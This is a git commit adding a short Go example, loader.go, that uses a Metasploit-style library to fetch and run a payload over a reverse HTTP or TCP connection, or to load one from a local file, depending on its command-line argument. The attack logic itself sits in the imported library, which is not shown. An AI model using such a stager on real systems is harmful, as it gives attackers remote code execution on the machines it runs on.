aee6c5f9e9831567dc725d9d3f2faecb00418f00
carvince <carvince@cisco.com>
2016-05-14 23:15:59 -0700

    added example loader

---
+++ example/loader.go
@@ -0,0 +1,23 @@
+package main
+
+import (
+	"msflib"
+	"os"
+	"strings"
+)
+
+func main() {
+	// check args
+	if len(os.Args) < 2 {
+		os.Exit(0)
+	}
+
+	switch {
+	case strings.HasPrefix(os.Args[1], "http"):
+		msflib.ReverseHTTP(os.Args[1])
+	case strings.HasPrefix(os.Args[1], "tcp"):
+		msflib.ReverseTCP(os.Args[1])
+	default:
+		msflib.LoadLocal(os.Args[1]) // assumes Arg[1] is a filename
+	}
+}
